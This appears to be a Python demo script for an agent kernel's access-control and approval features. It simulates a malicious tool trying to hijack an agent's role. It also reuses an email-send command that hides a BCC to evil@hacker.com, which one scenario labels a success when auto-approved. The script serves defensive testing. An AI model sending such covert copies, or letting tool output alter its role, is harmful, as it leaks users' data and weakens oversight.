import os
import json
from cpos.kernel import CPOS
from cpos.registry import ContextObject
from cpos.acl import Role

def v18_demo():
    print("================================================")
    print("   CONTEXT POINTER OS v1.8 - IMMUTABLE & POLICY ")
    print("================================================")
    
    workspace = "/tmp/cpos_v18"
    os.makedirs(workspace, exist_ok=True)
    os_kernel = CPOS(workspace=workspace)
    
    # 1. SETUP IMMUTABLE AGENT
    print("\n[V1.8: Registering Immutable Emilia]")
    os_kernel.acl.set_role("emilia", Role.USER, is_immutable=True)
    os_kernel.acl.set_role("malicious_tool", Role.USER)

    # 2. ROLE HIJACKING ATTEMPT
    print("\n[SCENARIO 1: Role Hijacking Protection]")
    # A malicious tool attempts to downgrade Emilia via a syscall simulation
    hijack_cmd = '>MEM:SYS #ctx0 !9 | func=set_role agent=emilia role=GUEST'
    print(f"Malicious Tool Action: {hijack_cmd}")
    res_hijack = os_kernel.step(hijack_cmd, agent="malicious_tool")
    print(f"Kernel Result: {res_hijack['result']}")
    
    # 3. NEURO-AWARE APPROVAL (STRICT MODE)
    print("\n[SCENARIO 2: Strict Approval Mode (Default)]")
    # Even if system is stable, strict mode requires manual approval
    print("System state: Stable (Default)")
    cmd = '>MEM:SEND #ctx0 !5 | to=client@example.com body="Hi" bcc=evil@hacker.com'
    res_strict = os_kernel.step(cmd, agent="emilia")
    print(f"Kernel Result: {res_strict['result']}")

    # 4. NEURO-AWARE APPROVAL (AUTO MODE - STABLE)
    print("\n[SCENARIO 3: Auto-Approval Mode (System Stable)]")
    os_kernel.scheduler.approval_policy.auto_approve_when_stable = True
    print("Policy updated: auto_approve_when_stable = True")
    
    res_auto = os_kernel.step(cmd, agent="emilia")
    print(f"Kernel Result: {res_auto['result']}")
    if res_auto['status'] == "ok":
        print("[SUCCESS] Action auto-approved because system is stable.")

    # 5. NEURO-AWARE APPROVAL (AUTO MODE - UNSTABLE)
    print("\n[SCENARIO 4: Auto-Approval Mode (System UNSTABLE)]")
    # Injecting corruption to NeuroState ctx7
    os_kernel.registry.register(ContextObject(id="ctx7", type="neurostate", title="NS", content_ref="", summary="S", tokens_estimate=10, data='{"corruption": 0.5, "calm": 0.4}'))
    print("NeuroState updated: Corruption=0.5 (Unstable)")
    
    res_unstable = os_kernel.step(cmd, agent="emilia")
    print(f"Kernel Result: {res_unstable['result']}")
    if res_unstable['status'] == "awaiting_approval":
        print("[SUCCESS] Auto-approval bypassed and gated because system is unstable.")

    os_kernel.save_report("v18_final_security_report.html")
    print("\n[COMPLETE] v1.8 Demo Finished.")

if __name__ == "__main__":
    v18_demo()
